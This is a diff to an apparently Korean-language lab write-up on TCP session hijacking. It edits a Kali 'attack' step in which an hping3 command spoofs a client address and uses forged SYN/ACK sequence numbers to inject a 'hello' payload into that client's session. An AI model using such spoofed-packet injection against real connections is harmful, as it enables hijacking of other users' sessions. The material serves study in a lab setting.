@@ -100,18 +100,18 @@ kali -> 파일생성
 
 <br>
 
-kali -> 
+kali -> 공격
 
 ![2022-09-30-20공격](../images/2022-09-30-TCPSessionHijacking/2022-09-30-20공격.jpg)
 
 ```
 hping3
 -a 172.16.0.100 공격대상 클라이언트(XP) :  syn,ack 를 변조할 대상
--s 1065(출발지 포트)
+-s 1030(출발지 포트)
 -p 9000(목적지 포트)
--M 1890668412(SYN)
--L 1099229640(ACK)
--E /root/data   (보낼글자가 있는 파일명 echo hello > /root/data)
+-M 0x275e5f60(SYN)
+-L 0xc945b972(ACK)
+-E /root/data.txt   (보낼글자가 있는 파일명 echo hello > /root/data)
 -d 6(hello+LF)
 -PA (PUSH,ACK)
 -c 1
